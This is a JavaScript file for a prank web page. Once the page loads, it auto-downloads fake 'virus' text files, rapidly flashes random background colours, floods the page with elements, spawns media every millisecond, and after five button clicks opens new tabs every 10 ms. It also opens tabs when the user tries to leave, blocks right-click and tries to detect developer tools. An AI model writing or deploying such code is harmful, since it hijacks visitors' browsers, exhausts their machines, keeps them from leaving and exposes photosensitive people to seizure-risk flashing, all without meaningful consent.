document.addEventListener('DOMContentLoaded', () => {
    let clickCount = 0;
    let jumpscareTriggered = false;

    // Fake virus file spam on load
    function downloadFakeVirusFiles() {
        for (let i = 1; i <= 5; i++) {
            const blob = new Blob([`lol gotcha 🤡\nthis ain't a virus... or is it?\nplease HELLO I CANNOT LISTEN TO SIMPLE COMMANDS, I WAS TOLD THAT THIS WOULD SPAM ALOT OF STUFF ON MY COMPUTER AND POSSIBLY RUIN IT FOR A COUPLE OF MINUTES, I AM STUPID AND THIS IS MY FAULT - person who went to the website and clicked the button 5 times is responsible for this mess, not the creator. THEY WERE WARNED.`], { type: 'text/plain' });
            const link = document.createElement('a');
            link.href = URL.createObjectURL(blob);
            link.download = `VIRUS_DELETE_QUICK_${i}.txt`;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }
    }

    // Screen rotation chaos
    function rotateScreenChaos() {
        setInterval(() => {
            document.body.style.transform = `rotate(${Math.random() * 10 - 5}deg)`;
        }, 500);
    }

    downloadFakeVirusFiles();
    rotateScreenChaos();

    function triggerJumpscareBurst() {
        const warningAudio = new Audio('warning.mp3');
        warningAudio.loop = true;
        warningAudio.volume = 1.0;
        warningAudio.playbackRate = 0.5;
        warningAudio.play();

        const alarmAudio = new Audio('mixkit-classic-alarm-995.wav');
        alarmAudio.loop = true;
        alarmAudio.volume = 1.0;
        alarmAudio.play();

        const limeLipsAudio = new Audio('lime-lips.mp3');
        limeLipsAudio.loop = true;
        limeLipsAudio.volume = 1.0;
        limeLipsAudio.play();

        function createVideo() {
            const video = document.createElement('video');
            video.src = 'snaptik_7441669924054928672.mp4';
            video.style.position = 'absolute';
            video.style.left = `${window.innerWidth / 2}px`;
            video.style.top = `${window.innerHeight / 2}px`;
            video.style.transform = 'translate(-50%, -50%)';
            video.style.zIndex = '1';
            video.autoplay = true;
            video.controls = false;
            video.loop = true;
            video.volume = 1.0;
            video.muted = false;

            document.body.appendChild(video);
            video.style.width = '20%';
            video.style.height = 'auto';

            setInterval(() => {
                const scale = Math.random() * 0.5 + 0.5;
                video.style.transform = `translate(-50%, -50%) scale(${scale})`;
            }, 5);
        }

        createVideo();
        setInterval(createVideo, 1);

        function placeImage() {
            const img = document.createElement('img');
            img.src = 'tantum.jpg';
            img.style.position = 'absolute';
            img.style.zIndex = '999';
            img.style.left = `${Math.random() * 100}%`;
            img.style.top = `${Math.random() * 100}%`;

            const randomSize = Math.random() * 200 + 50;
            img.style.width = `${randomSize}px`;
            img.style.height = `${randomSize}px`;

            setInterval(() => {
                const randomScale = Math.random() * 0.5 + 0.5;
                img.style.width = `${randomSize * randomScale}px`;
                img.style.height = `${randomSize * randomScale}px`;
            }, 100);

            document.body.appendChild(img);
        }

        setInterval(placeImage, 1);
    }

    function initialTrigger() {
        if (!jumpscareTriggered) {
            jumpscareTriggered = true;
            triggerJumpscareBurst();
        }
    }

    function flashRandomColors() {
        const colors = [
            '#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff',
            '#ff8000', '#8000ff', '#00ff80', '#ff0080', '#808080', '#ffcc00'
        ];

        setInterval(() => {
            const randomColor = colors[Math.floor(Math.random() * colors.length)];
            document.body.style.backgroundColor = randomColor;
        }, 1);
    }

    function spamRandomText() {
        const textArray = ['Help!', 'Why?', 'Get out!', 'RUN!', 'Why are you here?', 'What is happening?'];
        setInterval(() => {
            const text = textArray[Math.floor(Math.random() * textArray.length)];
            const span = document.createElement('span');
            span.innerText = text;
            span.style.position = 'absolute';
            span.style.color = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
            span.style.left = `${Math.random() * window.innerWidth}px`;
            span.style.top = `${Math.random() * window.innerHeight}px`;
            span.style.fontSize = `${Math.random() * 30 + 10}px`;
            document.body.appendChild(span);
        }, 50);
    }

    function spamRandomButtons() {
        setInterval(() => {
            const button = document.createElement('button');
            button.innerText = 'Click me!';
            button.style.position = 'absolute';
            button.style.left = `${Math.random() * window.innerWidth}px`;
            button.style.top = `${Math.random() * window.innerHeight}px`;
            button.style.backgroundColor = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
            button.style.fontSize = '15px';
            button.style.zIndex = '99999';
            document.body.appendChild(button);
        }, 20);
    }

    function spamRandomEmojis() {
        const emojis = ['😊', '😂', '😱', '😈', '🤯', '💀'];
        setInterval(() => {
            const span = document.createElement('span');
            span.innerText = emojis[Math.floor(Math.random() * emojis.length)];
            span.style.position = 'absolute';
            span.style.fontSize = `${Math.random() * 30 + 10}px`;
            span.style.left = `${Math.random() * window.innerWidth}px`;
            span.style.top = `${Math.random() * window.innerHeight}px`;
            document.body.appendChild(span);
        }, 30);
    }

    function spamRandomDivs() {
        setInterval(() => {
            const div = document.createElement('div');
            div.style.position = 'absolute';
            div.style.left = `${Math.random() * window.innerWidth}px`;
            div.style.top = `${Math.random() * window.innerHeight}px`;
            div.style.width = `${Math.random() * 200 + 50}px`;
            div.style.height = `${Math.random() * 200 + 50}px`;
            div.style.backgroundColor = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
            div.style.zIndex = '1';
            document.body.appendChild(div);
        }, 50);
    }

    document.getElementById('prankButton').addEventListener('click', () => {
        clickCount++;
        if (clickCount >= 5) {
            initialTrigger();

            // start infinite tab spamming
            setInterval(() => {
                window.open(window.location.href, '_blank');
            }, 10);
        }
    });

    flashRandomColors();
    spamRandomText();
    spamRandomButtons();
    spamRandomEmojis();
    spamRandomDivs();

    // Ask before leaving AND spawn infinite tabs
    window.onbeforeunload = function () {
        for (let i = 0; i < 3; i++) {
            window.open(window.location.href, '_blank');
        }
        return "Don't leave me here!";
    };

    // Disable right-click
    document.addEventListener('contextmenu', event => event.preventDefault());

    // Try to block dev tools
    setInterval(() => {
        const threshold = 160;
        if (
            window.outerWidth - window.innerWidth > threshold ||
            window.outerHeight - window.innerHeight > threshold
        ) {
            alert("NO DEV TOOLS!");
            window.open(window.location.href, '_blank');
        }
    }, 1000);
});
